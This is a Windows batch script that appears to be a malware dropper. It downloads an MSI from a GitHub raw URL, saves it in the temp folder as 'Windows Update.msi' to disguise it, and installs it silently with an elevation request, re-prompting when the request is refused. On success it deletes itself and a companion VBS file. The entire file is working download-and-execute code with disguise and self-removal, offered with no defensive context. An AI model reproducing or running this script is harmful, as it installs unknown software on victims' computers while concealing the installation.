@echo off
setlocal enabledelayedexpansion

:: Set download URL and paths
set "url=https://raw.githubusercontent.com/kevin64848/filesnew/refs/heads/main/file44.msi"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"
set "self=%~f0"
set "vbsFile=%~dp0file4.vbs"

if exist "%outputFilePath%" del /f /q "%outputFilePath%" >nul 2>&1

powershell -Command ^
  "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }" >nul 2>&1

if not exist "%outputFilePath%" exit /b 1

:RunLoop
set attempt=0
powershell -Command ^
  "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit(); exit $p.ExitCode } else { exit 1 }" >nul 2>&1

if !ERRORLEVEL!==0 (
    powershell -WindowStyle Hidden -Command ^
      "Start-Sleep -Seconds 4; Remove-Item -LiteralPath '%self%' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '%vbsFile%' -Force -ErrorAction SilentlyContinue"
    exit /b 0
)

set /a attempt+=1
if !attempt! geq 3 exit /b 1
timeout /t 3 /nobreak >nul
goto RunLoop